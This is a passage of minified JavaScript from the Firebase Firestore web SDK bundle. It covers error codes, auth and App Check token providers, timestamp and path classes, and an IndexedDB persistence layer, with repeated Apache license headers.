 */const M={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class L extends Js{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Pt{constructor(){this.promise=new Promise(((e,t)=>{this.resolve=e,this.reject=t}))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YT{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}let B4=class{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable((()=>t(bt.UNAUTHENTICATED)))}shutdown(){}};class j4{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable((()=>t(this.token.user)))}shutdown(){this.changeListener=null}}let q4=class{constructor(e){this.t=e,this.currentUser=bt.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){let n=this.i;const r=e=>this.i!==n?(n=this.i,t(e)):Promise.resolve();let i=new Pt;this.o=()=>{this.i++,this.currentUser=this.u(),i.resolve(),i=new Pt,e.enqueueRetryable((()=>r(this.currentUser)))};const s=()=>{const t=i;e.enqueueRetryable((async()=>{await t.promise,await r(this.currentUser)}))},o=e=>{V("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=e,this.auth.addAuthTokenListener(this.o),s()};this.t.onInit((e=>o(e))),setTimeout((()=>{if(!this.auth){const e=this.t.getImmediate({optional:!0});e?o(e):(V("FirebaseAuthCredentialsProvider","Auth not yet detected"),i.resolve(),i=new Pt)}}),0),s()}getToken(){const e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then((t=>this.i!==e?(V("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):t?(te("string"==typeof t.accessToken),new YT(t.accessToken,this.currentUser)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.auth.removeAuthTokenListener(this.o)}u(){const e=this.auth&&this.auth.getUid();return te(null===e||"string"==typeof e),new bt(e)}};class Y4{constructor(e,t,n){this.h=e,this.l=t,this.m=n,this.type="FirstParty",this.user=bt.FIRST_PARTY,this.g=new Map}p(){return this.m?this.m():null}get headers(){this.g.set("X-Goog-AuthUser",this.h);const e=this.p();return e&&this.g.set("Authorization",e),this.l&&this.g.set("X-Goog-Iam-Authorization-Token",this.l),this.g}}let W4=class{constructor(e,t,n){this.h=e,this.l=t,this.m=n}getToken(){return Promise.resolve(new Y4(this.h,this.l,this.m))}start(e,t){e.enqueueRetryable((()=>t(bt.FIRST_PARTY)))}shutdown(){}invalidateToken(){}};class G4{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class H4{constructor(e){this.I=e,this.forceRefresh=!1,this.appCheck=null,this.T=null}start(e,t){const n=e=>{null!=e.error&&V("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${e.error.message}`);const n=e.token!==this.T;return this.T=e.token,V("FirebaseAppCheckTokenProvider",`Received ${n?"new":"existing"} token.`),n?t(e.token):Promise.resolve()};this.o=t=>{e.enqueueRetryable((()=>n(t)))};const r=e=>{V("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=e,this.appCheck.addTokenListener(this.o)};this.I.onInit((e=>r(e))),setTimeout((()=>{if(!this.appCheck){const e=this.I.getImmediate({optional:!0});e?r(e):V("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}}),0)}getToken(){const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then((e=>e?(te("string"==typeof e.token),this.T=e.token,new G4(e.token)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.appCheck.removeTokenListener(this.o)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function K4(e){const t=typeof self<"u"&&(self.crypto||self.msCrypto),n=new Uint8Array(e);if(t&&"function"==typeof t.getRandomValues)t.getRandomValues(n);else for(let t=0;t<e;t++)n[t]=Math.floor(256*Math.random());return n}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class WT{static A(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=Math.floor(256/e.length)*e.length;let n="";for(;n.length<20;){const r=K4(40);for(let i=0;i<r.length;++i)n.length<20&&r[i]<t&&(n+=e.charAt(r[i]%e.length))}return n}}function ue(e,t){return e<t?-1:e>t?1:0}function ia(e,t,n){return e.length===t.length&&e.every(((e,r)=>n(e,t[r])))}function GT(e){return e+"\0"}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class et{constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new L(M.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new L(M.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<-62135596800)throw new L(M.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new L(M.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}static now(){return et.fromMillis(Date.now())}static fromDate(e){return et.fromMillis(e.getTime())}static fromMillis(e){const t=Math.floor(e/1e3),n=Math.floor(1e6*(e-1e3*t));return new et(t,n)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/1e6}_compareTo(e){return this.seconds===e.seconds?ue(this.nanoseconds,e.nanoseconds):ue(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){const e=this.seconds- -62135596800;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ee{constructor(e){this.timestamp=e}static fromTimestamp(e){return new ee(e)}static min(){return new ee(new et(0,0))}static max(){return new ee(new et(253402300799,999999999))}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iu{constructor(e,t,n){void 0===t?t=0:t>e.length&&G(),void 0===n?n=e.length-t:n>e.length-t&&G(),this.segments=e,this.offset=t,this.len=n}get length(){return this.len}isEqual(e){return 0===iu.comparator(this,e)}child(e){const t=this.segments.slice(this.offset,this.limit());return e instanceof iu?e.forEach((e=>{t.push(e)})):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=void 0===e?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return 0===this.length}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,n=this.limit();t<n;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){const n=Math.min(e.length,t.length);for(let r=0;r<n;r++){const n=e.get(r),i=t.get(r);if(n<i)return-1;if(n>i)return 1}return e.length<t.length?-1:e.length>t.length?1:0}}class Te extends iu{construct(e,t,n){return new Te(e,t,n)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}static fromString(...e){const t=[];for(const n of e){if(n.indexOf("//")>=0)throw new L(M.INVALID_ARGUMENT,`Invalid segment (${n}). Paths must not contain // in them.`);t.push(...n.split("/").filter((e=>e.length>0)))}return new Te(t)}static emptyPath(){return new Te([])}}const Q4=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class gt extends iu{construct(e,t,n){return new gt(e,t,n)}static isValidIdentifier(e){return Q4.test(e)}canonicalString(){return this.toArray().map((e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),gt.isValidIdentifier(e)||(e="`"+e+"`"),e))).join(".")}toString(){return this.canonicalString()}isKeyField(){return 1===this.length&&"__name__"===this.get(0)}static keyField(){return new gt(["__name__"])}static fromServerFormat(e){const t=[];let n="",r=0;const i=()=>{if(0===n.length)throw new L(M.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(n),n=""};let s=!1;for(;r<e.length;){const t=e[r];if("\\"===t){if(r+1===e.length)throw new L(M.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const t=e[r+1];if("\\"!==t&&"."!==t&&"`"!==t)throw new L(M.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);n+=t,r+=2}else"`"===t?(s=!s,r++):"."!==t||s?(n+=t,r++):(i(),r++)}if(i(),s)throw new L(M.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new gt(t)}static emptyPath(){return new gt([])}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class B{constructor(e){this.path=e}static fromPath(e){return new B(Te.fromString(e))}static fromName(e){return new B(Te.fromString(e).popFirst(5))}static empty(){return new B(Te.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return null!==e&&0===Te.comparator(this.path,e.path)}toString(){return this.path.toString()}static comparator(e,t){return Te.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new B(new Te(e.slice()))}}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class HT{constructor(e,t,n,r){this.indexId=e,this.collectionGroup=t,this.fields=n,this.indexState=r}}function Xm(e){return e.fields.find((e=>2===e.kind))}function ds(e){return e.fields.filter((e=>2!==e.kind))}HT.UNKNOWN_ID=-1;class X4{constructor(e,t){this.fieldPath=e,this.kind=t}}class Hh{constructor(e,t){this.sequenceNumber=e,this.offset=t}static empty(){return new Hh(0,An.min())}}function KT(e,t){const n=e.toTimestamp().seconds,r=e.toTimestamp().nanoseconds+1,i=ee.fromTimestamp(1e9===r?new et(n+1,0):new et(n,r));return new An(i,B.empty(),t)}function QT(e){return new An(e.readTime,e.key,-1)}class An{constructor(e,t,n){this.readTime=e,this.documentKey=t,this.largestBatchId=n}static min(){return new An(ee.min(),B.empty(),-1)}static max(){return new An(ee.max(),B.empty(),-1)}}function Jy(e,t){let n=e.readTime.compareTo(t.readTime);return 0!==n?n:(n=B.comparator(e.documentKey,t.documentKey),0!==n?n:ue(e.largestBatchId,t.largestBatchId))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const XT="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class JT{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach((e=>e()))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Qi(e){if(e.code!==M.FAILED_PRECONDITION||e.message!==XT)throw e;V("LocalStore","Unexpectedly lost primary lease")}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class C{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e((e=>{this.isDone=!0,this.result=e,this.nextCallback&&this.nextCallback(e)}),(e=>{this.isDone=!0,this.error=e,this.catchCallback&&this.catchCallback(e)}))}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&G(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new C(((n,r)=>{this.nextCallback=t=>{this.wrapSuccess(e,t).next(n,r)},this.catchCallback=e=>{this.wrapFailure(t,e).next(n,r)}}))}toPromise(){return new Promise(((e,t)=>{this.next(e,t)}))}wrapUserFunction(e){try{const t=e();return t instanceof C?t:C.resolve(t)}catch(e){return C.reject(e)}}wrapSuccess(e,t){return e?this.wrapUserFunction((()=>e(t))):C.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction((()=>e(t))):C.reject(t)}static resolve(e){return new C(((t,n)=>{t(e)}))}static reject(e){return new C(((t,n)=>{n(e)}))}static waitFor(e){return new C(((t,n)=>{let r=0,i=0,s=!1;e.forEach((e=>{++r,e.next((()=>{++i,s&&i===r&&t()}),(e=>n(e)))})),s=!0,i===r&&t()}))}static or(e){let t=C.resolve(!1);for(const n of e)t=t.next((e=>e?C.resolve(e):n()));return t}static forEach(e,t){const n=[];return e.forEach(((e,r)=>{n.push(t.call(this,e,r))})),this.waitFor(n)}static mapArray(e,t){return new C(((n,r)=>{const i=e.length,s=new Array(i);let o=0;for(let a=0;a<i;a++){const l=a;t(e[l]).next((e=>{s[l]=e,++o,o===i&&n(s)}),(e=>r(e)))}}))}static doWhile(e,t){return new C(((n,r)=>{const i=()=>{!0===e()?t().next((()=>{i()}),r):n()};i()}))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qd{constructor(e,t){this.action=e,this.transaction=t,this.aborted=!1,this.R=new Pt,this.transaction.oncomplete=()=>{this.R.resolve()},this.transaction.onabort=()=>{t.error?this.R.reject(new Il(e,t.error)):this.R.resolve()},this.transaction.onerror=t=>{const n=Zy(t.target.error);this.R.reject(new Il(e,n))}}static open(e,t,n,r){try{return new qd(t,e.transaction(r,n))}catch(e){throw new Il(t,e)}}get v(){return this.R.promise}abort(e){e&&this.R.reject(e),this.aborted||(V("SimpleDb","Aborting transaction:",e?e.message:"Client-initiated abort"),this.aborted=!0,this.transaction.abort())}P(){const e=this.transaction;this.aborted||"function"!=typeof e.commit||e.commit()}store(e){const t=this.transaction.objectStore(e);return new Z4(t)}}class er{constructor(e,t,n){this.name=e,this.version=t,this.V=n,12.2===er.S(Am())&&mt("Firestore persistence suffers from a bug in iOS 12.2 Safari that may cause your app to stop working. See https://stackoverflow.com/q/56496296/110915 for details and a potential workaround.")}static delete(e){return V("SimpleDb","Removing database:",e),ps(window.indexedDB.deleteDatabase(e)).toPromise()}static D(){if(!N2())return!1;if(er.C())return!0;const e=Am(),t=er.S(e),n=0<t&&t<10,r=er.N(e),i=0<r&&r<4.5;return!(e.indexOf("MSIE ")>0||e.indexOf("Trident/")>0||e.indexOf("Edge/")>0||n||i)}static C(){var e;return typeof process<"u"&&"YES"===(null===(e=process.env)||void 0===e?void 0:e.k)}static M(e,t){return e.store(t)}static S(e){const t=e.match(/i(?:phone|pad|pod) os ([\d_]+)/i),n=t?t[1].split("_").slice(0,2).join("."):"-1";return Number(n)}static N(e){const t=e.match(/Android ([\d.]+)/i),n=t?t[1].split(".").slice(0,2).join("."):"-1";return Number(n)}async O(e){return this.db||(V("SimpleDb","Opening database:",this.name),this.db=await new Promise(((t,n)=>{const r=indexedDB.open(this.name,this.version);r.onsuccess=e=>{const n=e.target.result;t(n)},r.onblocked=()=>{n(new Il(e,"Cannot upgrade IndexedDB schema while another tab is open. Close all tabs that access Firestore and reload this page to proceed."))},r.onerror=t=>{const r=t.target.error;"VersionError"===r.name?n(new L(M.FAILED_PRECONDITION,"A newer version of the Firestore SDK was previously used and so the persisted data is not compatible with the version of the SDK you are now using. The SDK will operate with persistence disabled. If you need persistence, please re-upgrade to a newer version of the SDK or else clear the persisted IndexedDB data for your app to start fresh.")):"InvalidStateError"===r.name?n(new L(M.FAILED_PRECONDITION,"Unable to open an IndexedDB connection. This could be due to running in a private browsing session on a browser whose private browsing sessions do not support IndexedDB: "+r)):n(new Il(e,r))},r.onupgradeneeded=e=>{V("SimpleDb",'Database "'+this.name+'" requires upgrade from version:',e.oldVersion);const t=e.target.result;this.V.$(t,r.transaction,e.oldVersion,this.version).next((()=>{V("SimpleDb","Database upgrade to version "+this.version+" complete")}))}}))),this.F&&(this.db.onversionchange=e=>this.F(e)),this.db}B(e){this.F=e,this.db&&(this.db.onversionchange=t=>e(t))}async runTransaction(e,t,n,r){const i="readonly"===t;let s=0;for(;;){++s;try{this.db=await this.O(e);const t=qd.open(this.db,e,i?"readonly":"readwrite",n),s=r(t).next((e=>(t.P(),e))).catch((e=>(t.abort(e),C.reject(e)))).toPromise();return s.catch((()=>{})),await t.v,s}catch(e){const t=e,n="FirebaseError"!==t.name&&s<3;if(V("SimpleDb","Transaction failed with error:",t.message,"Retrying:",n),this.close(),!n)return Promise.reject(t)}}}close(){this.db&&this.db.close(),this.db=void 0}}class J4{constructor(e){this.L=e,this.q=!1,this.U=null}get isDone(){return this.q}get K(){return this.U}set cursor(e){this.L=e}done(){this.q=!0}G(e){this.U=e}delete(){return ps(this.L.delete())}}class Il extends L{constructor(e,t){super(M.UNAVAILABLE,`IndexedDB transaction '${e}' failed: ${t}`),this.name="IndexedDbTransactionError"}}function Xi(e){return"IndexedDbTransactionError"===e.name}class Z4{constructor(e){this.store=e}put(e,t){let n;return void 0!==t?(V("SimpleDb","PUT",this.store.name,e,t),n=this.store.put(t,e)):(V("SimpleDb","PUT",this.store.name,"<auto-key>",e),n=this.store.put(e)),ps(n)}add(e){return V("SimpleDb","ADD",this.store.name,e,e),ps(this.store.add(e))}get(e){return ps(this.store.get(e)).next((t=>(void 0===t&&(t=null),V("SimpleDb","GET",this.store.name,e,t),t)))}delete(e){return V("SimpleDb","DELETE",this.store.name,e),ps(this.store.delete(e))}count(){return V("SimpleDb","COUNT",this.store.name),ps(this.store.count())}j(e,t){const n=this.options(e,t);if(n.index||"function"!=typeof this.store.getAll){const e=this.cursor(n),t=[];return this.W(e,((e,n)=>{t.push(n)})).next((()=>t))}{const e=this.store.getAll(n.range);return new C(((t,n)=>{e.onerror=e=>{n(e.target.error)},e.onsuccess=e=>{t(e.target.result)}}))}}H(e,t){const n=this.store.getAll(e,null===t?void 0:t);return new C(((e,t)=>{n.onerror=e=>{t(e.target.error)},n.onsuccess=t=>{e(t.target.result)}}))}J(e,t){V("SimpleDb","DELETE ALL",this.store.name);const n=this.options(e,t);n.Y=!1;const r=this.cursor(n);return this.W(r,((e,t,n)=>n.delete()))}X(e,t){let n;t?n=e:(n={},t=e);const r=this.cursor(n);return this.W(r,t)}Z(e){const t=this.cursor({});return new C(((n,r)=>{t.onerror=e=>{const t=Zy(e.target.error);r(t)},t.onsuccess=t=>{const r=t.target.result;r?e(r.primaryKey,r.value).next((e=>{e?r.continue():n()})):n()}}))}W(e,t){const n=[];return new C(((r,i)=>{e.onerror=e=>{i(e.target.error)},e.onsuccess=e=>{const i=e.target.result;if(!i)return void r();const s=new J4(i),o=t(i.primaryKey,i.value,s);if(o instanceof C){const e=o.catch((e=>(s.done(),C.reject(e))));n.push(e)}s.isDone?r():null===s.K?i.continue():i.continue(s.K)}})).next((()=>C.waitFor(n)))}options(e,t){let n;return void 0!==e&&("string"==typeof e?n=e:t=e),{index:n,range:t}}cursor(e){let t="next";if(e.reverse&&(t="prev"),e.index){const n=this.store.index(e.index);return e.Y?n.openKeyCursor(e.range,t):n.openCursor(e.range,t)}return this.store.openCursor(e.range,t)}}function ps(e){return new C(((t,n)=>{e.onsuccess=e=>{const n=e.target.result;t(n)},e.onerror=e=>{const t=Zy(e.target.error);n(t)}}))}let Vw=!1;function Zy(e){const t=er.S(Am());if(t>=12.2&&t<13){const t="An internal error was encountered in the Indexed Database server";if(e.message.indexOf(t)>=0){const e=new L("internal",`IOS_INDEXEDDB_BUG1: IndexedDb has thrown '${t}'. This is likely due to an unavoidable bug in iOS. See https://stackoverflow.com/q/56496296/110915 for details and a potential workaround.`);return Vw||(Vw=!0,setTimeout((()=>{throw e}),0)),e}}return e}class e${constructor(e,t){this.asyncQueue=e,this.tt=t,this.task=null}start(){this.et(15e3)}stop(){this.task&&(this.task.cancel(),this.task=null)}get started(){return null!==this.task}et(e){V("IndexBackiller",`Scheduled in ${e}ms`),this.task=this.asyncQueue.enqueueAfterDelay("index_backfill",e,(async()=>{this.task=null;try{V("IndexBackiller",`Documents written: ${await this.tt.nt()}`)}catch(e){Xi(e)?V("IndexBackiller","Ignoring IndexedDB error during index backfill: ",e):await Qi(e)}await this.et(6e4)}))}}class t${constructor(e,t){this.localStore=e,this.persistence=t}async nt(e=50){return this.persistence.runTransaction("Backfill Indexes","readwrite-primary",(t=>this.st(t,e)))}st(e,t){const n=new Set;let r=t,i=!0;return C.doWhile((()=>!0===i&&r>0),(()=>this.localStore.indexManager.getNextCollectionGroupToUpdate(e).next((t=>{if(null!==t&&!n.has(t))return V("IndexBackiller",`Processing collection: ${t}`),this.it(e,t,r).next((e=>{r-=e,n.add(t)}));i=!1})))).next((()=>t-r))}it(e,t,n){return this.localStore.indexManager.getMinOffsetFromCollectionGroup(e,t).next((r=>this.localStore.localDocuments.getNextDocuments(e,t,r,n).next((n=>{const i=n.changes;return this.localStore.indexManager.updateIndexEntries(e,i).next((()=>this.rt(r,n))).next((n=>(V("IndexBackiller",`Updating offset: ${n}`),this.localStore.indexManager.updateCollectionGroup(e,t,n)))).next((()=>i.size))}))))}rt(e,t){let n=e;return t.changes.forEach(((e,t)=>{const r=QT(t);Jy(r,n)>0&&(n=r)})),new An(n.readTime,n.documentKey,Math.max(t.batchId,e.largestBatchId))
/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class wn{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=e=>this.ot(e),this.ut=e=>t.writeSequenceNumber(e))}ot(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.ut&&this.ut(e),e}}function Ou(e){return null==e}function su(e){return 0===e&&1/e==-1/0}function ZT(e){return"number"==typeof e&&Number.isInteger(e)&&!su(e)&&e<=Number.MAX_SAFE_INTEGER&&e>=Number.MIN_SAFE_INTEGER}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
